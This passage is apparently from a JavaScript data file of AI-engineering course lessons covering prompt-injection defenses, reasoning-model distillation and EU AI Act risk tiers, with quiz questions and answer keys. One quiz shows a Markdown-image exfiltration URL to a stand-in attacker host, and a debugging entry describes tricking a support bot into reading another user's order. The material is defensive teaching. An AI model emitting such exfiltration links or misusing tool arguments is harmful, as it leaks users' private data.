        detail: 'Wrap untrusted inputs in `<untrusted_data>` with a closing sandwich reminder, strip write tools from summarization agents (Least Privilege), and ALWAYS bind `user_id` from the authenticated backend JWT session rather than trusting LLM tool arguments!',
        exampleOrFormula: 'db.orders.find({ id: toolArgs.orderId, ownerId: req.session.verifiedUserId })'
      }
    ],
    comparisonTable: {
      title: 'Web AppSec Vulnerability vs. AI Security Equivalent',
      headers: ['Classic Web Vulnerability', 'AI / LLM Equivalent', 'Mandatory Deterministic Defense'],
      rows: [
        ['SQL Injection (`OR 1=1`)', 'Direct Prompt Injection', 'XML Tag Isolation + Input Guardrail Classifier'],
        ['Stored XSS / CSRF', 'Indirect Prompt Injection via RAG/Email', 'Least Privilege Tool Separation + HITL Approval'],
        ['Insecure Direct Object Ref (IDOR)', 'LLM passing another user’s `user_id` to a tool', 'Bind `user_id` from server-side JWT, never from LLM args']
      ]
    },
    debuggingPlaybook: {
      symptom: 'During red-teaming, a user tricks the support bot into querying Order #1002 belonging to another customer.',
      rootCause: 'The `get_order_details(order_id, user_id)` tool trusted the `user_id` parameter generated by the LLM.',
      exactFix: 'Remove `user_id` from the LLM tool schema completely! Inject `authenticatedUserId` directly from the server-side JWT middleware.'
    },
    microCheck: {
      question: 'Quick Check: Why should you disable external Markdown image rendering (`![img](https://evil.com/steal?secret=...)`) in an enterprise AI chat UI?',
      options: [
        'Because an Indirect Prompt Injection can instruct the LLM to encode sensitive conversation data into the URL query string of a Markdown image, silently exfiltrating data when the browser fetches the image!',
        'Because images slow down CSS animations.',
        'Because Markdown only supports JPEG.'
      ],
      correctIndex: 0,
      explanation: 'Markdown image URL exfiltration is one of the most common data-stealing vectors in Indirect Prompt Injection attacks!'
    }
  },
  't5-l1': {
    lessonId: 't5-l1',
    stepByStepGuide: [
      {
        stepNumber: 1,
        title: 'Test-Time Compute (Reasoning Models) vs. Pre-Training Scaling',
        detail: 'Reasoning models (Claude Extended Thinking, Gemini Thinking, OpenAI o-series) spend dynamic inference-time compute generating hidden verification tokens (`budget_tokens`) to test hypotheses and backtrack before answering.',
        exampleOrFormula: 'Simple Query -> Fast SLM/Flash (<300ms) | Complex Multi-Constraint Code/Math -> Reasoning Model'
      },
      {
        stepNumber: 2,
        title: 'Teacher-Student Knowledge Distillation for SLMs',
        detail: 'Use a large Reasoning Model offline (the Teacher) to generate and verify 5,000 golden responses, then fine-tune a compact Small Language Model (the Student) to run in production at 1/15th the cost and <200ms latency.',
        exampleOrFormula: 'Frontier Teacher + Golden Eval Suite ===(Distillation)===> Fast Production SLM'
      }
    ],
    comparisonTable: {
      title: 'Standard Prompting vs. Reasoning Model Prompting',
      headers: ['Prompting Aspect', 'Standard Fast LLM', 'Reasoning Model (Extended Thinking)'],
      rows: [
        ['Chain-of-Thought Instructions', 'Explicitly ask for `<scratchpad>` / step-by-step', 'Built-in—avoid micromanaging *how* to think'],
        ['Best Prompt Style', 'Detailed procedural steps + few-shot examples', 'Crisp goal specification + strict boundary constraints'],
        ['Ideal Use Case', 'Low-latency customer chat & routing', 'Complex architecture, code debugging, offline Judge']
      ]
    },
    debuggingPlaybook: {
      symptom: 'A live voice agent keeps talking for 8 seconds after the human user interrupts to ask a clarifying question.',
      rootCause: 'Missing Voice Activity Detection (VAD) "Barge-In" interruption handling on the WebSocket audio stream.',
      exactFix: 'Wire VAD barge-in events to immediately flush the client audio playback buffer and send a `client_interrupt` frame over the WebSocket.'
    },
    microCheck: {
      question: 'Quick Check: What makes it safe for an engineering team to replace an expensive frontier model with a 10x cheaper distilled Small Language Model (SLM)?',
      options: [
        'Benchmarking the distilled SLM against the exact same Golden Evaluation Suite (Faithfulness, Schema Compliance, Edge Cases) to prove zero quality regression!',
        'Hoping users don’t notice.',
        'Turning off logging.'
      ],
      correctIndex: 0,
      explanation: 'Your automated Golden Eval Suite is the enabler that unlocks 80%+ cost savings via model routing and distillation!'
    }
  },
  't5-l2': {
    lessonId: 't5-l2',
    stepByStepGuide: [
      {
        stepNumber: 1,
        title: 'Classifying Systems Under the EU AI Act & NIST AI RMF',
        detail: 'AI deployed in HR recruiting, credit scoring, healthcare triage, or critical infrastructure is classified as High-Risk—requiring documented datasets, bias testing, human oversight, and immutable audit logs.',
        exampleOrFormula: 'NIST AI RMF Lifecycle: Govern -> Map -> Measure (Evals!) -> Manage'
      },
      {
        stepNumber: 2,
        title: 'Generating Immutable AI Release Audit Manifests in CI/CD',
        detail: 'Every production deployment should log an automated JSON Release Manifest recording the Git SHA, prompt template version, model ID, and pass rates across Faithfulness, PII safety, and OWASP injection resilience.',
        exampleOrFormula: 'Release Gate: Faithfulness >= 0.95 && InjectionBlockRate >= 0.99 && PiiLeaks === 0'
      }
    ],
    comparisonTable: {
      title: 'EU AI Act Risk Tiers for AI Engineers',
      headers: ['Risk Tier', 'Example AI Application', 'Engineering & QA Obligation'],
      rows: [
        ['High-Risk AI', 'Automated Resume Screening / Credit Scoring / Medical', 'Mandatory eval logs, bias audits, human-in-the-loop oversight'],
        ['Limited / Transparency Risk', 'Customer Support Chatbot', 'Clear disclosure that the user is interacting with AI'],
        ['Minimal Risk', 'Internal Code Autocomplete / Spam Filter', 'Standard software quality best practices']
      ]
    },
    debuggingPlaybook: {
      symptom: 'Enterprise compliance blocks your AI feature launch 2 days before go-live because you cannot prove how the model was tested against bias and prompt injection.',
      rootCause: 'No automated evaluation artifacts or release manifests were saved during development.',
      exactFix: 'Generate and archive a versioned JSON/HTML Evaluation & Red-Team Scorecard in CI/CD on every release tag.'
    },
    microCheck: {
      question: 'Quick Check: Under the EU AI Act, how is an AI agent that screens and ranks job applicants’ resumes classified?',
      options: [
        'High-Risk AI System (requiring strict evaluation documentation, bias auditing, logging, and human oversight).',
        'Minimal Risk with zero obligations.',
        'Exempt from all regulations.'
      ],
      correctIndex: 0,
      explanation: 'Employment and HR screening systems are explicitly designated as High-Risk under the EU AI Act!'
    }
  }
};

